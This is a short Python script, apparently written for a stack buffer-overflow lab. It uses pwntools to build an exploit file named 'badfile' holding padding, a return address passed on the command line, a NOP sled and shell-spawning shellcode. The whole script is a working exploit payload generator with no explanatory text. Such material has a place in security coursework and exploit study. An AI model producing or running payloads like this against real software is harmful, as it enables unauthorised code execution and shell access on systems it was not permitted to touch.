import sys
import os
os.environ['PWNLIB_NOTERM'] = 'True'
from pwn import *

shellcode = asm(shellcraft.sh()).replace(b'/sh', b'zsh')

with open('badfile', 'wb') as f:
    f.write(b'A' * 36 + p32(int(sys.argv[1], 16)) + b'\x90' * 400 + shellcode)
